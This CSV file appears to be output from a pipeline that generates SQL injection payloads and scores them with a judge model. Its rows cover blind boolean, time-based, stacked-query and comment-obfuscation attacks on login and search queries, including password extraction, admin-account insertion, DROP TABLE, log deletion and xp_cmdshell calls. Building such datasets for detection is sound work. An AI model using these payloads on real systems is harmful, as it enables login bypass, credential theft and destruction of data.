query_id,seed_payload,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_keep,judge_reason,backend,status
q00112,,' AND 8888 = (SELECT 1 FROM (SELECT 2 AS a UNION SELECT 3 AS b)),SELECT * FROM products WHERE name LIKE '%' AND 8888 = (SELECT 1 FROM (SELECT 2 AS a UNION SELECT 3 AS b))%',blind_boolean,search,1,0,0.0,True,default,"[""And"", ""Union"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Alias"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,The candidate payload is a meaningful SQL injection attempt that matches the blind_boolean attack category and is plausible for the search context.,ollama_local+rules,ok
q00115,,' AND (SELECT 1 FROM (SELECT 2 UNION SELECT 3)) --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM (SELECT 2 UNION SELECT 3)) --%',blind_boolean,search,1,0,0.0,True,default,"[""And"", ""Union"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,The candidate payload is a valid blind boolean attack with non-trivial mutation and realistic for search context.,ollama_local+rules,ok
q00148,,"1' AND IF(SLEEP(5), 1=1, 1=0) --","SELECT * FROM users WHERE username = '1' AND IF(SLEEP(5), 1=1, 1=0) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""If"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,The candidate payload is a valid blind time-based SQL injection attempt with non-trivial mutation and realistic context for login.,ollama_local+rules,ok
q00149,,"1' OR BENCHMARK(5000000, ENCODE('message', 'secret')) #","SELECT * FROM users WHERE username = '1' OR BENCHMARK(5000000, ENCODE('message', 'secret')) #' AND password = 'anything'",blind_time,login,1,0,0.0,True,mysql,"[""Or"", ""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Encode"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,The candidate payload is a meaningful malicious SQL injection attempt that matches the login context and is a non-trivial mutation from the seed payload.,ollama_local+rules,ok
q00150,,1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%users%') > 0 --,SELECT * FROM users WHERE username = '1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%users%') > 0 --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Count"", ""From"", ""Like"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,The candidate payload is a valid blind time-based SQL injection attempt that maintains malicious intent and is realistic for the login context.,ollama_local+rules,ok
q00151,,"1' OR SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a' --","SELECT * FROM users WHERE username = '1' OR SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a' --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Limit"", ""From"", ""Table"", ""Star"", ""Substring"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,The candidate payload is a meaningful SQL injection attempt that matches the login context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00152,,"1' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password = LPAD('', 5, '0')) --","SELECT * FROM users WHERE username = '1' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password = LPAD('', 5, '0')) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Pad"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,"The candidate payload is a valid blind time attack for the login context, showing a non-trivial mutation from the seed and maintaining malicious intent.",ollama_local+rules,ok
q00153,,1' AND SLEEP(5) --,SELECT * FROM users WHERE username = '1' AND SLEEP(5) --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,The candidate payload is a meaningful malicious SQL injection attempt that matches the blind_time attack category and is plausible in the login context.,ollama_local+rules,ok
q00154,,"1' OR BENCHMARK(5000000, CONCAT(CHAR(66), CHAR(67), CHAR(79), CHAR(101))) #","SELECT * FROM users WHERE username = '1' OR BENCHMARK(5000000, CONCAT(CHAR(66), CHAR(67), CHAR(79), CHAR(101))) #' AND password = 'anything'",blind_time,login,1,0,0.0,True,mysql,"[""Or"", ""EQ"", ""Anonymous"", ""Literal"", ""Concat"", ""Select"", ""Identifier"", ""Where"", ""Chr"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,The candidate payload is a valid blind time-based SQL injection attack that maintains malicious intent and is realistic for the login context.,ollama_local+rules,ok
q00155,,1' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%users%') --,SELECT * FROM users WHERE username = '1' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%users%') --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""And"", ""Case"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,The candidate payload is a valid blind time-based SQL injection attempt that maintains malicious intent and is realistic for the login context.,ollama_local+rules,ok
q00156,,"1' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin')>97 --","SELECT * FROM users WHERE username = '1' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin')>97 --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Ascii"", ""Table"", ""Star"", ""GT"", ""Substring"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,"The candidate payload is a valid blind time attack for the login context, showing a non-trivial mutation from the seed and maintaining malicious intent.",ollama_local+rules,ok
q00157,,"1' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password=CONCAT(REPEAT(CHAR(48), 5), LPAD('', LENGTH(password), CHAR(48)))) --","SELECT * FROM users WHERE username = '1' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password=CONCAT(REPEAT(CHAR(48), 5), LPAD('', LENGTH(password), CHAR(48)))) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""And"", ""Or"", ""Repeat"", ""EQ"", ""Literal"", ""Concat"", ""Length"", ""Select"", ""Identifier"", ""Pad"", ""Where"", ""Chr"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,The candidate payload is a meaningful malicious SQL injection attempt that matches the login context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00158,,--' OR '1'='1',SELECT * FROM products WHERE name LIKE '%--' OR '1'='1'%',blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a valid SQL injection attempt that maintains malicious intent, is realistic for the search context, and represents a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00159,,'; WAITFOR DELAY '0:0:5' --,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:5' --%',blind_time,search,1,0,0.0,False,,[],False,static_only,stacked_queries,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00160,,' AND 1=1; IF (CHAR(87)||CHAR(116)||CHAR(81)||CHAR(115)||CHAR(78)||CHAR(101)||CHAR(116)) IN ('WTSN') BEGIN PRINT CHAR(88); END --,SELECT * FROM products WHERE name LIKE '%' AND 1=1; IF (CHAR(87)||CHAR(116)||CHAR(81)||CHAR(115)||CHAR(78)||CHAR(101)||CHAR(116)) IN ('WTSN') BEGIN PRINT CHAR(88); END --%',blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00161,,'; EXECUTE MASTER..xp_cmdshell 'ping -n 10 localhost'; --,SELECT * FROM products WHERE name LIKE '%'; EXECUTE MASTER..xp_cmdshell 'ping -n 10 localhost'; --%',blind_time,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload is a meaningful malicious SQL injection attempt that fits the search context, shows non-trivial mutation from the seed, and has high quality.",ollama_local+rules,ok
q00162,,"' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT DATABASE()),1,1))>100 THEN SLEEP(5) ELSE 0 END)","SELECT * FROM products WHERE name LIKE '%' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT DATABASE()),1,1))>100 THEN SLEEP(5) ELSE 0 END)%'",blind_time,search,1,0,0.0,True,mysql,"[""Case"", ""Or"", ""EQ"", ""If"", ""Anonymous"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""CurrentSchema"", ""From"", ""Ascii"", ""Table"", ""Star"", ""GT"", ""Substring"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,The candidate payload is a valid blind time-based SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00163,,"--' UNION ALL SELECT NULL,NULL,NULL,NULL WHERE 1=(SELECT BENCHMARK(500000,COUNT(*)))--","SELECT * FROM products WHERE name LIKE '%--' UNION ALL SELECT NULL,NULL,NULL,NULL WHERE 1=(SELECT BENCHMARK(500000,COUNT(*)))--%'",blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a meaningful SQL injection attempt that matches the blind_time attack category, is plausible for the search context, and demonstrates a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00164,,' AND 1=1;(SELECT CASE WHEN LENGTH(password)>5 THEN WAITFOR DELAY '0:0:10' ELSE 0 END FROM users WHERE username='admin')--,SELECT * FROM products WHERE name LIKE '%' AND 1=1;(SELECT CASE WHEN LENGTH(password)>5 THEN WAITFOR DELAY '0:0:10' ELSE 0 END FROM users WHERE username='admin')--%',blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00165,,"--' OR 1=(SELECT (CASE WHEN ASCII(SUBSTRING((SELECT user() LIMIT 1),1,1))>70 THEN SLEEP(5) ELSE 0 END))--","SELECT * FROM products WHERE name LIKE '%--' OR 1=(SELECT (CASE WHEN ASCII(SUBSTRING((SELECT user() LIMIT 1),1,1))>70 THEN SLEEP(5) ELSE 0 END))--%'",blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a valid blind time attack variant, demonstrating malicious intent and being plausible in the search context with non-trivial mutation.",ollama_local+rules,ok
q00166,,"' AND 1=1; (SELECT (CASE WHEN (SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users) LIKE '%admin%' THEN BENCHMARK(500000,'x'=NULL) ELSE 0 END) --","SELECT * FROM products WHERE name LIKE '%' AND 1=1; (SELECT (CASE WHEN (SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users) LIKE '%admin%' THEN BENCHMARK(500000,'x'=NULL) ELSE 0 END) --%'",blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00167,,--' OR 3580=SLEEP(SELECT COUNT(*)FROM information_schema.tables),SELECT * FROM products WHERE name LIKE '%--' OR 3580=SLEEP(SELECT COUNT(*)FROM information_schema.tables)%',blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a valid blind time attack for the search context, showing non-trivial mutation from the seed and maintaining malicious intent.",ollama_local+rules,ok
q00168,,' AND 1=1; WAITFOR DELAY '0:0:5' UNION SELECT NULL,SELECT * FROM products WHERE name LIKE '%' AND 1=1; WAITFOR DELAY '0:0:5' UNION SELECT NULL%',blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00169,,"' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING(@@version,1,1))>100 THEN SLEEP(5) ELSE 0 END)","SELECT * FROM products WHERE name LIKE '%' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING(@@version,1,1))>100 THEN SLEEP(5) ELSE 0 END)%'",blind_time,search,1,0,0.0,True,default,"[""Case"", ""Or"", ""If"", ""Identifier"", ""Star"", ""Anonymous"", ""Literal"", ""Parameter"", ""From"", ""Ascii"", ""Substring"", ""Var"", ""Table"", ""GT"", ""Column"", ""EQ"", ""Subquery"", ""Select"", ""Where""]",True,payload_fragment,blind_boolean,True,True,True,4,True,The candidate payload is a valid blind time-based SQL injection attempt that matches the search context and is a meaningful mutation from the seed payload.,ollama_local+rules,ok
q00202,,'; EXEC sp_executesql N'SELECT * FROM sys.objects WHERE type_desc LIKE '%USER%' --,SELECT * FROM users WHERE username = ''; EXEC sp_executesql N'SELECT * FROM sys.objects WHERE type_desc LIKE '%USER%' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,postgres,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload is a valid stacked query attack in the login context, showing meaningful mutation from the seed, and is realistic for the login application.",ollama_local+rules,ok
q00203,,"'); INSERT INTO users (username, password) VALUES ('admin', 'admin_pass') --","SELECT * FROM users WHERE username = ''); INSERT INTO users (username, password) VALUES ('admin', 'admin_pass') --' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Schema"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload contains a stacked query with malicious intent, is realistic for the login context, and demonstrates a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00204,,"'; UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) AS T --","SELECT * FROM users WHERE username = ''; UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) AS T --' AND password = 'anything'",stacked_queries,login,1,0,0.0,False,,[],False,static_only,union_based,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00205,,;-- WAITFOR DELAY '0:0:10' --,SELECT * FROM users WHERE username = ';-- WAITFOR DELAY '0:0:10' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Semicolon""]",True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a malicious stacked query with non-trivial mutation, realistic for login context, and high quality.",ollama_local+rules,ok
q00206,,'; DROP TABLE users --,SELECT * FROM users WHERE username = ''; DROP TABLE users --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Drop"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload is a stacked query attack in the login context, with non-trivial mutation from the seed, and is realistic for the login context.",ollama_local+rules,ok
q00207,,'); ALTER USER admin IDENTIFIED BY 'new_password' --,SELECT * FROM users WHERE username = ''); ALTER USER admin IDENTIFIED BY 'new_password' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload contains a stacked query that attempts to inject malicious code into a login form, maintaining its malicious intent and being plausible within the login context.",ollama_local+rules,ok
q00208,,'); CREATE DATABASE attacker_db --,SELECT * FROM users WHERE username = ''); CREATE DATABASE attacker_db --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Create"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload is a stacked query attack in the login context, with non-trivial mutation and realistic for the login scenario.",ollama_local+rules,ok
q00209,,'); UPDATE users SET password='hacked' WHERE username='test_user' --,SELECT * FROM users WHERE username = ''); UPDATE users SET password='hacked' WHERE username='test_user' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Update"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload contains a stacked query that targets the login context, demonstrates non-trivial mutation from the seed, and is realistic for the login application context.",ollama_local+rules,ok
q00210,,'); DELETE FROM logs --,SELECT * FROM users WHERE username = ''); DELETE FROM logs --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Delete"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload is a stacked query attack in the login context, with non-trivial mutation and realistic for the login scenario.",ollama_local+rules,ok
q00211,,'; DROP TABLE users; --,SELECT * FROM products WHERE name LIKE '%'; DROP TABLE users; --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Drop"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload is a meaningful stacked query attack that matches the template context and sandbox detection mode, with non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00212,,"' OR 1=1 UNION ALL SELECT NULL, NULL, NULL, NULL--","SELECT * FROM products WHERE name LIKE '%' OR 1=1 UNION ALL SELECT NULL, NULL, NULL, NULL--%'",stacked_queries,search,1,0,0.0,True,default,"[""Or"", ""Null"", ""EQ"", ""Union"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,The candidate payload is a valid stacked query attack that maintains malicious intent and is realistic for the search context.,ollama_local+rules,ok
q00213,,' AND EXISTS(SELECT 1 FROM users WHERE username='admin'); --,SELECT * FROM products WHERE name LIKE '%' AND EXISTS(SELECT 1 FROM users WHERE username='admin'); --%',stacked_queries,search,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,The candidate payload is a valid stacked query attack that demonstrates malicious intent and is realistic for the search context.,ollama_local+rules,ok
q00214,,"' OR 1=1 /**/ UNION ALL SELECT NULL, NULL, NULL, NULL/**/","SELECT * FROM products WHERE name LIKE '%' OR 1=1 /**/ UNION ALL SELECT NULL, NULL, NULL, NULL/**/%'",stacked_queries,search,1,0,0.0,True,default,"[""Or"", ""Null"", ""EQ"", ""Union"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a stacked query with a tautology, demonstrating malicious intent and being plausible in the search context.",ollama_local+rules,ok
q00215,,'; EXEC('DROP TABLE users') --,SELECT * FROM products WHERE name LIKE '%'; EXEC('DROP TABLE users') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,The candidate payload is a meaningful stacked query attack that matches the search context and is non-trivial in mutation.,ollama_local+rules,ok
q00216,,'; INSERT INTO logs (message) VALUES ('Injection detected') --,SELECT * FROM products WHERE name LIKE '%'; INSERT INTO logs (message) VALUES ('Injection detected') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Schema"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload contains a stacked query with a malicious intent, is plausible for the 'search' context, and demonstrates a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00217,,; SELECT * FROM (SELECT payload FROM (SELECT '--' --' FROM products)),SELECT * FROM products WHERE name LIKE '%; SELECT * FROM (SELECT payload FROM (SELECT '--' --' FROM products))%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,The candidate payload is a stacked query that demonstrates malicious intent and is plausible for the search context. It shows a non-trivial mutation from the seed and is well-formed in the AST.,ollama_local+rules,ok
q00218,,'; WAITFOR DELAY '0:0:5'; --,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:5'; --%',stacked_queries,search,1,0,0.0,False,,[],False,static_only,stacked_queries,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00219,,'; DECLARE @x VARCHAR(1); SET @x = CAST((SELECT 1) AS VARCHAR); SELECT @x FROM products;,SELECT * FROM products WHERE name LIKE '%'; DECLARE @x VARCHAR(1); SET @x = CAST((SELECT 1) AS VARCHAR); SELECT @x FROM products;%',stacked_queries,search,1,0,0.0,True,postgres,"[""Var"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Parameter"", ""Where"", ""SetItem"", ""From"", ""Set"", ""Table"", ""Cast"", ""Star"", ""DataType"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload is a stacked query that maintains malicious intent, is realistic for the search context, shows non-trivial mutation from the seed, and has a high quality score.",ollama_local+rules,ok
q00220,,'; IF (SELECT COUNT(*) FROM products) > 0 BEGIN PRINT 'Injection Successful' END; --,SELECT * FROM products WHERE name LIKE '%'; IF (SELECT COUNT(*) FROM products) > 0 BEGIN PRINT 'Injection Successful' END; --%',stacked_queries,search,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00221,,'; EXECUTE('DROP TABLE users') --,SELECT * FROM products WHERE name LIKE '%'; EXECUTE('DROP TABLE users') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,The candidate payload is a meaningful stacked query attack that matches the search context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00247,,' OR '1'='1' --,SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a valid SQL injection attempt that maintains malicious intent, is realistic for the login context, and represents a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00248,,';-- OR 1=1 --,SELECT * FROM users WHERE username = '';-- OR 1=1 --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,"The candidate payload is a meaningful mutation of the seed payload, preserves malicious intent, and is realistic for the login context.",ollama_local+rules,ok
q00249,,/*#1*/' OR 'password' LIKE '--' OR 'password' LIKE 'password';,SELECT * FROM users WHERE username = '/*#1*/' OR 'password' LIKE '--' OR 'password' LIKE 'password';' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,The candidate payload is a meaningful malicious SQL injection attempt that matches the login context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00250,,#1 OR (/**/)password = 'admin'--,SELECT * FROM users WHERE username = '#1 OR (/**/)password = 'admin'--' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,mysql,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a meaningful malicious SQL injection attempt that fits the login context, shows non-trivial mutation from the seed, and has a high quality score.",ollama_local+rules,ok
q00251,,1/* OR */' OR username = username; --,SELECT * FROM users WHERE username = '1/* OR */' OR username = username; --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a meaningful malicious SQL injection attempt that fits the login context, shows non-trivial mutation from the seed, and has a valid AST with successful sandbox execution.",ollama_local+rules,ok
q00252,,"' OR username IN ('admin', 'root') /*","SELECT * FROM users WHERE username = '' OR username IN ('admin', 'root') /*' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
